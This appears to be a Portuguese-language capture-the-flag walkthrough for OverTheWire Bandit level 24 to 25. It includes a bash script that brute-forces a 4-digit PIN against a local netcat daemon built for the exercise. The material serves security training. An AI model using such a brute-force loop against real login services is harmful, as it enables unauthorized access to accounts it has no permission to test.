# Nível 24 - 25 (OverTheWire: Bandit)

### 📌 Descrição do Desafio

A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.
You do not need to create new connections each time

---

### 🎯 Objetivo

Devemos realizar um bruteforce para capturar a senha do próximo nível.

---


### 🔍 Passo a Passo da Lógica

* Ao entrar no servidor, acessei o serviço via netcat:

```
nc localhost 30002
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
```
* Testei uma entrada em branco (errada) para analizar o comportamento:

```
Wrong! Please enter the correct current password and pincode. Try again.
```

* Com isso, obtive as informações necessárias para criar o script para descobrir a senha, mas antes, entrei em um diretório temporário para ter mais liberdade:

```
bandit24@bandit:~$ mktemp -d
/tmp/tmp.BdpOycvnkx
bandit24@bandit:~$ cd /tmp/tmp.BdpOycvnkx
```

* Agora para o script, escrevi o seguinte código:

```
#!/bin/bash
senha=<senha do nível>
for i in {0000..9999}; do
            echo "$senha $i"
done | nc localhost 30002  | grep -v "Wrong! Please enter the correct current password and pincode. Try again." | grep -v "I am the pincode checker for user bandit25"
```
* O script basicamente vai entrar no serviço via netcat, testando cada senha de 0000 até 9999, ignorando as saídas que aparecem quando dá erro e quando inica a conexão.

---

### ✔️ Resultado Final

Ao executar o script, a senha do usuário do próximo nível é revelada.

---

### 📚 Aprendizados do Nível

Aprendemos a fazer um script simples de bruteforce, muito é massa véi.

---

## 🔗 Próximo Nível

[Ir para o próximo nível](../25%20(Level%2025%20-%2026)/readme.md)